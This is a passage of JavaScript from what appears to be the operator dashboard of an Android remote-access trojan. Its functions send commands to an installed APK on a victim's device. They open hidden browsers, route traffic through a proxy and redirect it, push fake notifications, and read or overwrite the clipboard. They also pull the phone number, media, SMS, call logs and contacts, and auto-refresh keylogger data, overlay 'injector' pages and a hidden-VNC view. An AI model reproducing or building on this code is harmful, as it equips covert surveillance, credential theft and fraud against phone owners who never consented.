    var name=(document.getElementById('renameInput')||{}).value||'';
    if(!name){showToast('Enter a name','error');return;}
    // Rename[>SKT<]<name>
    apiFetch('POST','/api/apk/work',{msg:'wrk',cmnd:'Rename[>SKT<]'+name})
    .then(function(){showToast('Renamed to: '+name,'success');})
    .catch(function(e){showToast(e.message,'error');});
}
function connectionRestart(){
    // Connection[>SKT<]R
    apiFetch('POST','/api/apk/work',{msg:'wrk',cmnd:'Connection[>SKT<]R'})
    .then(function(){showToast('Restart sent','success');})
    .catch(function(e){showToast(e.message,'error');});
}
function connectionDisable(){
    if(!confirm('This will kill the APK process on device. Continue?'))return;
    // Connection[>SKT<]D
    apiFetch('POST','/api/apk/work',{msg:'wrk',cmnd:'Connection[>SKT<]D'})
    .then(function(){showToast('Disable sent','info');})
    .catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// BROWSER — brows msg subc:h/n  ltype:f/u/lp/re/add/cp/s
// ============================================================
function browserHidden(){
    var url=(document.getElementById('hiddenBrowserUrl')||{}).value||'';
    var ua=(document.getElementById('hiddenBrowserUA')||{}).value||'';
    if(!url){showToast('Enter a URL','error');return;}
    apiFetch('POST','/api/browser/hidden',{url:url,ua:ua})
    .then(function(){showToast('Hidden browser opened (brows subc:h)','success');})
    .catch(function(e){showToast(e.message,'error');});
}
function browserNormal(){
    var url=(document.getElementById('browserUrl')||{}).value||'';
    var ltype=(document.getElementById('browserLtype')||{}).value||'f';
    if(!url&&!['re','cp','s'].includes(ltype)){showToast('Enter a URL','error');return;}
    apiFetch('POST','/api/browser/navigate',{url:url,type:ltype})
    .then(function(){showToast('Browser command sent (brows subc:n ltype:'+ltype+')','success');})
    .catch(function(e){showToast(e.message,'error');});
}

// ============================================================
// PROXY — proxy msg subc:1/0
// ============================================================
function proxyOn(){
    apiFetch('POST','/api/proxy/toggle',{enable:true}).then(function(){
        showToast('Proxy ON (proxy subc:1)','success');
        var s=document.getElementById('proxyStatus');if(s)s.textContent='Proxy is ON';
    }).catch(function(e){showToast(e.message,'error');});
}
function proxyOff(){
    apiFetch('POST','/api/proxy/toggle',{enable:false}).then(function(){
        showToast('Proxy OFF (proxy subc:0)','info');
        var s=document.getElementById('proxyStatus');if(s)s.textContent='Proxy is OFF';
    }).catch(function(e){showToast(e.message,'error');});
}

// ============================================================
// REDIRECT — red msg  relink / reip / rckey
// ============================================================
function sendRedirect(){
    var reip=(document.getElementById('redirectIp')||{}).value||'';
    var relink=(document.getElementById('redirectLink')||{}).value||'';
    var rckey=(document.getElementById('redirectKey')||{}).value||'';
    if(!reip&&!relink){showToast('Enter target IP or URL','error');return;}
    apiFetch('POST','/api/redirect',{relink:relink,reip:reip,rckey:rckey})
    .then(function(){showToast('Redirect sent (red msg)','success');})
    .catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// BROADCAST — bc msg subc:N/A  |  chat msg
// ============================================================
function sendBroadcastNotif(){
    var title=(document.getElementById('notifTitle')||{}).value||'';
    var msg=(document.getElementById('notifMsg')||{}).value||'';
    var pkg=(document.getElementById('notifPackage')||{}).value||'';
    if(!title||!msg){showToast('Title and message required','error');return;}
    apiFetch('POST','/api/broadcast/notification',{title:title,message:msg,package:pkg})
    .then(function(){showToast('Notification sent (bc subc:N)','success');})
    .catch(function(e){showToast(e.message,'error');});
}
function sendBroadcastAlert(){
    var title=(document.getElementById('alertTitle')||{}).value||'';
    var msg=(document.getElementById('alertMsg')||{}).value||'';
    if(!title||!msg){showToast('Title and message required','error');return;}
    apiFetch('POST','/api/broadcast/alert',{title:title,message:msg})
    .then(function(){showToast('Alert sent (bc subc:A)','success');})
    .catch(function(e){showToast(e.message,'error');});
}
function sendChat(){
    var title=(document.getElementById('chatTitle')||{}).value||'';
    var msg=(document.getElementById('chatMsg')||{}).value||'';
    if(!msg){showToast('Message required','error');return;}
    apiFetch('POST','/api/chat/send',{title:title,message:msg})
    .then(function(){showToast('Chat message sent (chat msg)','success');})
    .catch(function(e){showToast(e.message,'error');});
}

// ============================================================
// MEDIA SEARCH — srh msg sfor:i/v/a/d
// ============================================================
function searchMedia(type){
    apiFetch('POST','/api/search/media',{type:type}).then(function(){
        var labels={i:'Images',v:'Videos',a:'Audio',d:'Documents'};
        showToast('Search started: '+labels[type]+' (srh sfor:'+type+')','success');
        var el=document.getElementById('searchResults');
        if(el)el.innerHTML='<div class="empty">Waiting for results from device...</div>';
    }).catch(function(e){showToast(e.message,'error');});
}

// FETCH number — fetch msg subc:num
function fetchNumber(){
    apiFetch('GET','/api/fetch/number').then(function(){
        showToast('Phone number requested (fetch subc:num)','info');
        var el=document.getElementById('fetchResult');
        if(el)el.textContent='Waiting for device response...';
    }).catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// CLIPBOARD — clip msg cas:0/1
// ============================================================
function getClipboard(){
    apiFetch('GET','/api/clipboard').then(function(r){
        var text=r&&r.content&&r.content[0]?r.content[0].text:'';
        var el=document.getElementById('clipboardContent');
        if(el)el.textContent=text||'(empty)';
        showToast('Clipboard fetched (clip cas:0)','success');
    }).catch(function(e){showToast(e.message,'error');});
}
function setClipboard(){
    var text=(document.getElementById('clipboardInput')||{}).value||'';
    if(!text){showToast('Enter text to set','error');return;}
    apiFetch('POST','/api/clipboard',{text:text}).then(function(){
        showToast('Clipboard set (clip cas:1)','success');
    }).catch(function(e){showToast(e.message,'error');});
}

// ============================================================
// SETTINGS — APK health / delete
// ============================================================
function loadApkHealth(){
    apiFetch('GET','/api/apk/info').then(function(r){
        var el=document.getElementById('apkHealthOutput');
        if(el)el.textContent=JSON.stringify(r,null,2);
        showToast('Health loaded','success');
    }).catch(function(e){showToast(e.message,'error');});
}
function deleteApk(){
    if(!confirm('Send Delete command to device? This will prompt uninstall on device.'))return;
    // Delete command from CommandsList
    apiFetch('POST','/api/apk/work',{msg:'wrk',cmnd:'Delete'})
    .then(function(){showToast('Delete command sent','info');})
    .catch(function(e){showToast(e.message,'error');});
}

// ============================================================
// SCREEN QUICK ACTIONS (quick action bar on dashboard)
// ============================================================
function quickAction(action){
    var map={
        'home':'/api/control/home','back':'/api/control/back',
        'screenshot':'/api/control/screenshot','lock':'/api/control/lock',
        'recent':'/api/control/recent','power':'/api/control/power',
        'volume-up':'/api/control/volume-up','volume-down':'/api/control/volume-down'
    };
    var url=map[action];
    if(!url){showToast('Unknown action','error');return;}
    apiFetch('POST',url).then(function(){
        if(action==='screenshot')showToast('Screenshot requested','success');
        else showToast(action,'success');
    }).catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// TAB SWITCHING — central router
// ============================================================
var _currentTab='home';
function switchTab(tabId){
    _currentTab=tabId;
    document.querySelectorAll('.tab-view').forEach(function(el){el.classList.remove('active');});
    var target=document.getElementById(tabId);
    if(target)target.classList.add('active');
    document.querySelectorAll('.nav-item').forEach(function(el){el.classList.remove('active');});
    var navItem=document.querySelector('.nav-item[data-tab="'+tabId+'"]');
    if(navItem)navItem.classList.add('active');
    var title=document.getElementById('topbarTitle');
    if(title&&navItem)title.textContent=navItem.querySelector('span:last-child').textContent;
    // Handle HBNC fullscreen layout
    if(tabId==='hbcn'){document.body.classList.add('hbnc-mode');}
    else{document.body.classList.remove('hbnc-mode');}
    // Lazy load data on tab open
    if(tabId==='apps')loadApps();
    if(tabId==='keylog')loadKeylogData();
    if(tabId==='mcptools')switchToMCPTools&&switchToMCPTools();
    if(tabId==='injector')loadOverlayPages&&loadOverlayPages();
    if(tabId==='services')loadServices&&loadServices();
    if(tabId==='inject')loadPages&&loadPages();
    if(tabId==='files')fileLoadDir();
    if(tabId==='calls')loadCallLog();
    if(tabId==='sms')loadSMS();
    if(tabId==='contacts')loadContacts();
    if(tabId==='camera')cameraListCameras();
    if(tabId==='hbcn')openHBNC&&openHBNC();
    if(tabId==='notifications')loadNotifications();
    if(tabId==='inputviz')inputVizConnect();
}

// ============================================================
// INIT on DOM ready
// ============================================================
document.addEventListener('DOMContentLoaded',function(){
    startDevicePolling();

    // Auto-refresh keylog every 8s if on tab
    setInterval(function(){if(_currentTab==='keylog')loadKeylogData();},8000);
    // Auto-refresh notifications every 10s if on tab
    setInterval(function(){if(_currentTab==='notifications')loadNotifications();},10000);
    // Auto-refresh apps every 15s if on tab
    setInterval(function(){if(_currentTab==='apps')loadApps();},15000);
    // Auto-refresh sms every 10s if on tab
    setInterval(function(){if(_currentTab==='sms')loadSMS();},10000);
    // Auto-refresh call log every 15s
    setInterval(function(){if(_currentTab==='calls')loadCallLog();},15000);
    // Auto-refresh contacts every 20s
    setInterval(function(){if(_currentTab==='contacts')loadContacts();},20000);

    // ESC closes modals
    document.addEventListener('keydown',function(e){
        if(e.key==='Escape'){
            var m=document.getElementById('urlModal');
            if(m)m.classList.remove('open');
        }
    });
});
